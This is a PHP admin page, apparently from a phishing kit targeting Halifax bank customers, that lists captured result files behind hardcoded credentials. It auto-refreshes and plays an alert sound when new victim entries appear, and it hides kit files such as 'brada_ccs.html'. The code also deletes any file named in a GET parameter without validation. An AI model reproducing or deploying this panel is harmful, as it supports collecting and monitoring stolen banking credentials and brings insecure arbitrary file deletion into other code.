<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
?>


<?php
$usuario = "crazy";
$senha = "crazy1010";
 

function erro(){
    
    header('WWW-Authenticate: Basic realm="Administracao"');
    header('HTTP/1.0 401 Unauthorized');
	
    echo '<h1>Voce n&atilde;o tem permiss&atilde;o para acessar essa &aacute;rea</h1>';

    exit;
}
 

if (!isset($_SERVER['PHP_AUTH_USER']) or !isset($_SERVER['PHP_AUTH_PW'])) {
	erro();
} 

else {
	
	if ($_SERVER['PHP_AUTH_USER'] != $usuario or $_SERVER['PHP_AUTH_PW'] != $senha) {
		erro();
	}
}


if(@$_GET['deleta'] <>'')
{
unlink("".$_GET['deleta']); 
header('Location: doydoo.php');
}

function varSet($VAR) { return isset($_GET[$VAR]) ? $_GET[$VAR] : ""; }
$action = varSet("action");
$pasta = base64_decode(varSet("pasta"));
 
$denyFiles = array(".htaccess","brada_ccs.html","index.php","doydoo.php","ler.php","alerta.mp3","seguro.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="refresh" content="3;URL=<?php echo $_SERVER['PHP_SELF']; ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Listagem de Arquivos</title>
<style type="text/css">
body {
font:11px Verdana, Arial, Helvetica, sans-serif;
padding:0px;
margin:0px;
}
a {
text-decoration:none;
color:#003366;
}
a:hover { color:#0099CC }
.row1 { background-color:#F7F7F7 }
.row2 { background-color:#EBEBEB }
.rowOver { background-color:#C7DCFC }
.extCell { font-weight:bold }
</style>
<script language="javascript" type="text/javascript">
function over(Obj) {
nClass = Obj.className
Obj.className = "rowOver"
Obj.onmouseout = function() {
Obj.className = nClass
}
}
</script>
</head>
<body>
<?php
if ($action == ""):
$fdir = "./";
chdir($fdir);
$dir = opendir(".");
while ($file = readdir($dir)) if (is_dir($file)) $dirs[] = $file; else $files[] = $file;
$row = 2;
?>
<div class="container">
<table width="700" border="0" align="center" cellpadding="0" cellspacing="0" class="table table-bordered">
<tr>
<td height="50px;"><strong>Showing:</strong> Halifax <?php echo empty($pasta) ? "" : $pasta; ?></td>
</tr>
</table></div>
<div class="container">
<table width="700" border="0" align="center" cellpadding="0" cellspacing="0" class="table table-bordered">
<tr style="font-weight:bold">
<td width="55" height="20">&nbsp;</td>
<td width="400">Nome</td>
<td width="130">Tamanho</td>
<td width="10">Hora</td>
</tr>
<?php if ($pasta != ""): ?>
<tr class="row<?php echo $row; ?>" onmouseover="over(this)">
<td align="center" width="55" height="20" class="extCell">[DIR]</td>
<td><a href="?pasta=<?php echo base64_encode(substr("$pasta",0,strrpos($pasta,"/"))); ?>">..</a></td>
<td>--</td>
<td>&nbsp;</td>
</tr>
<?php endif; ?>
<?php
if (is_array($dirs)) :
sort($dirs);
foreach ($dirs as $nome):
if ($nome == ".." || $nome == ".") continue;
if ($row == 2) $row = 1; else $row = 2;
?>
<tr class="row<?php echo $row; ?>" onmouseover="over(this)">
<td align="center" width="55" height="20" class="extCell">[DIR]</td>
<td><a href="?pasta=<?php echo base64_encode("$nome"); ?>"><?php echo $nome; ?></a></td>
<td>--</td>
<td>&nbsp;</td>
</tr>
<?php
endforeach;
endif;
?>
<?php
$total ="0";
if (is_array(@$files)):
array_multisort(array_map('filemtime', $files), SORT_DESC, $files);  
foreach ($files as $nome):
if (in_array(strtolower($nome),$denyFiles)) continue;
if ($row == 2) $row = 1; else $row = 2;
$tamanho = filesize("./$nome");
$info = pathinfo("./$nome");
$total=$total+1;
$data = date ("H:i:s", filemtime($nome));
?>
<tr class="row<?php echo $row; ?>" onmouseover="over(this)">
<td align="center" width="55" height="20" class="extCell">[<?php echo strtoupper($info["extension"]); ?>]</td>
<td><a href="ler.php?file=<?php echo $nome; ?>"><?php echo $nome; ?></a> </td>
<td><?php echo $tamanho > 1048576 ? round($tamanho/1048576,2)." Mb" : round($tamanho/1024,2)." Kb"; ?></td>
<td><?php echo $data; ?></td>
</tr>
<?php

endforeach;
endif;
?>
</table></div>
<?php endif; ?>
</body>
</html>
<?php
echo "[<br><br><center>" . $total. " Halifax </center> <br><br>]";
if(@$total <> '0'){
echo "<center><audio controls autoplay> <source src=alerta.mp3 type=audio/mpeg> </audio></center>";
}
closedir($dir); 
?>
